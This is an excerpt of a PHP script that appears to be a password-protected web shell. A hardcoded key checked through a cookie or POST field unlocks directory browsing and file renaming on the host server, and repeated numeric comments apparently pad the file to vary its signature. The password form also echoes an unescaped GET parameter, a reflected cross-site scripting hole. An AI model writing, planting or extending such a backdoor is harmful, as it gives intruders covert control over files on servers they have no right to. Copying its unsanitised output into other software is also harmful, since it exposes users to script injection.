...
$auth_key = "5791650703462991e61b59e40a588a5b";
...
$pass = false;
if (isset($_COOKIE['pw_name_60200'])) {
    if(($_COOKIE['pw_name_60200']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_60200'])) {
        if(($_POST['pw_name_60200']) == $auth_key) {
            setcookie("pw_name_60200", $_POST['pw_name_60200']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_60200' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738802528792767 1738802528637058 1738802528109821 1738802528721290
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738802528792767 1738802528637058 1738802528109821 1738802528721290
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738802528792767 1738802528637058 1738802528109821 1738802528721290
            $name = PATH . "/" . $_GET['r'];
